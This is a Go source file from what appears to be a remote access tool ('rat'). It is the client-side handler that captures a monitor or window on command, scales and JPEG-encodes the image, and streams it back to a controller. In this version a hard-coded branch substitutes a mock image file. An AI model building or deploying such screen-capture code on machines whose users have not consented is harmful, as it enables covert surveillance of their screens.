package main

import (
	"bytes"
	"image"
	"image/jpeg"
	"os"
	"rat/client/screen"
	"rat/shared/network/header"

	"github.com/disintegration/imaging"
	"gopkg.in/mgo.v2/bson"
)

var screenStream bool
var monitor bool
var handle int
var scale float32

type RecvScreenPacket struct {
	Active  bool
	Scale   float32
	Monitor bool
	Handle  int
}

func (packet RecvScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

type SendScreenPacket struct {
	Buffer []byte "buffer"
	Width  int
	Height int
}

func (packet SendScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet RecvScreenPacket) OnReceive() error {
	if packet.Active && !screenStream {
		// Dispatch one screen packet
		Queue <- &SendScreenPacket{}
	}

	screenStream = packet.Active
	monitor = packet.Monitor
	handle = packet.Handle
	scale = packet.Scale

	return nil
}

func (packet *SendScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	var img image.Image
	if true {
		// Read image from file that already exists
		existingImageFile, err := os.Open("mock_scrot.png")
		if err != nil {
			// Handle error
		}
		defer existingImageFile.Close()

		// Calling the generic image.Decode() will tell give us the data
		// and type of image it is as a string. We expect "png"
		img, _, _ = image.Decode(existingImageFile)
	} else if monitor {
		if handle >= len(screen.Monitors) {
			handle = 0
		}

		img = screen.Capture(screen.Monitors[handle])
	} else {
		img = screen.CaptureWindow(handle)
	}

	if img == nil {
		return
	}

	if scale > 0 && scale < 1.0 {
		width := float32(img.Bounds().Max.X) * scale
		height := float32(img.Bounds().Max.Y) * scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()
	packet.Width = img.Bounds().Max.X
	packet.Height = img.Bounds().Max.Y

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}

func (packet RecvScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
